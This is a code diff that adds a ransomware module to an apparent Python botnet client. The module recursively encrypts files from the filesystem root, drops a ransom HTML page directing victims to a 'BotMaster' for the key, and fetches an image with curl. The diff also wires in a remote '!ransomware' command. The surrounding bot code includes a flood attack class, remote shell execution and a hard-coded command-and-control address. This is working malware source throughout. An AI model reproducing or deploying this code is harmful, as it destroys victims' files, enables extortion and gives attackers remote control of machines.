@@ -3331,6 +3331,128 @@ class TCP_UDP_Flood:
                 time.sleep(self.delay)
             except:
                 pass
+class RansomWare:
+    def __init__(self, key):
+        self.key = key
+        self.fernet = Fernet(self.key)
+        self.dirlist = []
+        self.filelist = []
+        self.keyfile = "key.txt"
+        self.recovery_directory = ""
+        if sys.platform == "win32":
+            os.chdir("C:/")
+            self.recovery_directory = f"C:/Users/{os.getlogin()}/"
+        else:
+            self.recovery_directory = "/"
+            os.chdir("/")
+    def get_dir_list(self):
+        for i in os.listdir():
+            try:
+                file = open(i, "rb")
+                file.close()
+                self.filelist.append(os.path.join(os.getcwd(),i))
+            except:
+                self.dirlist.append(os.path.join(os.getcwd(), i))
+    def encrypt_file(self, file):
+        try:
+            with open(file, "rb") as og_file:
+                content = self.fernet.encrypt(og_file.read())
+                og_file.close()
+            with open(file, "wb") as enc_file:
+                enc_file.write(content)
+                enc_file.close()
+        except:
+            pass
+    def encrypt(self):
+        self.get_dir_list()
+        for i in self.dirlist:
+            try:
+                os.chdir(i)
+                self.get_dir_list()
+            except:
+                pass
+        for i in self.filelist:
+            file_thread = threading.Thread(target=self.encrypt_file, args=(i,))
+            file_thread.start()
+        self.ransom()
+        self.checker = threading.Thread(target=self.check_key_file)
+        self.checker.start()
+    def decrypt(self):
+        for i in self.filelist:
+            try:
+                with open(i,"rb") as enc_file:
+                    content = self.fernet.decrypt(enc_file.read())
+                    enc_file.close()
+                with open(i,"wb") as new_file:
+                    new_file.write(content)
+                    new_file.close()
+            except:
+                pass
+    def download_emotional_support(self):
+        cmd = subprocess.Popen(f"cd {self.recovery_directory}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        _cmd = subprocess.Popen(f"curl -o barbara.png https://i.redd.it/w2eduogz9ir51.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    def recovering_html_code(self):
+        return f'''
+<!DOCTYPE html>
+<head></head>
+<title>You're in Luck | Your files are being decrypted!</title>
+<body bgcolor='red'>
+<h1>Lucky you!</h1>
+<h2>You have successfully put the correct encryption key into the text file({self.keyfile}).</h2>
+<h2>Please wait a moment, as the decrypted files are being decrypted at this moment.
+<h4>You can say your goodbyes to Barbara!</h4>
+<img src="barbara.png" alt="Where is the image?" width="300" height="500">
+</body>
+        '''
+    def ransom_html_code(self):
+        return f'''
+<!DOCTYPE html>
+<head></head>
+<body bgcolor='red'>
+<title>Oops! | You've been Compromised!</title>
+<h1>Oops!</h1>
+<h2>Looks like your files have been encrypted.</h2>
+<h3>There is hope.</h3><br>
+A file has been created in this directory: {self.recovery_directory}{self.keyfile}<br>
+Simply place the encryption key of your files in the file(and this file only), and you will have your files back!<br>
+How you will get your key? Well, that's all up to the BotMaster.
+<h2>Heres a picture of Barbara! Perhaps she will give you emotional Support....</h2><br>
+<img src="barbara.png" alt="Where is the image?" width="300" height="500">
+</body>
+        '''
+    def check_key_file(self):
+        while True:
+            try:
+                file = open(f"{self.recovery_directory}{self.keyfile}","rb")
+                content = file.read()
+                if bytes(content.strip()) == self.key:
+                    self.decryptor = threading.Thread(target=self.decrypt)
+                    self.decryptor.start()
+                    self.ransom(True)
+                    break
+                time.sleep(1)
+            except:
+                pass
+    def ransom(self, recovering=False):
+        os.chdir(self.recovery_directory)
+        if not recovering:
+            keyfile = open(self.keyfile,"w")
+            keyfile.close()
+            self.download_emotional_support()
+            filename = "Oops.html"
+        else:
+            filename = "Yay.html"
+            bot.make_selffiles_encrypted_false()
+        file = open(f"{self.recovery_directory}{filename}","w")
+        if recovering:
+            file.write(self.recovering_html_code())
+        else:
+            file.write(self.ransom_html_code())
+        file.close()
+        if sys.platform == "win32":
+            os.startfile(file.name)
+        else:
+            os.system(f"open {file.name}")
 class Bot:
     def __init__(self, ip, port, enc_key):
         self.ip = ip
@@ -3338,6 +3460,7 @@ class Bot:
         self.sendingfile = False
         self.enc_key = enc_key
         self.can_encrypt = False
+        self.files_encrypted = False
         self.sql_connected = False
         try:
             self.fernet = Fernet(self.enc_key)
@@ -3362,6 +3485,7 @@ class Bot:
                 self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.client.connect((self.ip, self.port))
                 banner = self.client.recv(1024).decode()
+                time.sleep(5)
                 break
             except:
                 self.client.close()
@@ -3376,6 +3500,8 @@ class Bot:
         for i in msg:
             filename += f" {i}"
         return filename.strip()
+    def make_selffiles_encrypted_false(self):
+        self.files_encrypted = False
     def recv(self):
         while True:
             try:
@@ -3496,6 +3622,11 @@ class Bot:
                 elif msg.startswith("!mkdir"):
                     dir = self.get_filename(msg)
                     os.mkdir(dir)
+                elif msg.startswith("!ransomware"):
+                    if not self.files_encrypted:
+                        self.ransomware = RansomWare(self.enc_key)
+                        self.ransomware.encrypt()
+                        self.files_encrypted = True
                 elif msg.startswith("!createfile"):
                     file = self.get_filename(msg)
                     if file in os.listdir():
@@ -3561,7 +3692,9 @@ class Bot:
                         time.sleep(1)
                         self.client.send("File transfer to server completed.".encode())
                     except:
-                        self.client.send("!fileerror".encode())
+                        self.client.send("File was not found in the bot directory.".encode())
+                        time.sleep(3)
+                        self.client.send("!stopsave".encode())
                 elif msg.startswith("!download"):
                     try:
                         link = msg.split()[1]
@@ -3575,7 +3708,7 @@ class Bot:
                     self.client.send(cmd.stdout.read())
                     self.client.send(cmd.stderr.read())
             except Exception as e:
-                print(e)
+                pass
         elif self.writing_mode:
             write_msg = f"\n{msg}".encode()
             if msg == "!stopwrite":
@@ -3597,6 +3730,6 @@ class Bot:
                     self.client.send(output.encode())
                 except Exception as e:
                     self.client.send(f"There was an error in the Database file: {e}".encode())
-bot = Bot('192.168.0.88',8081, b"b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8'")
+bot = Bot('192.168.0.87',8081, b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=')
 bot.initiate_connection()
         
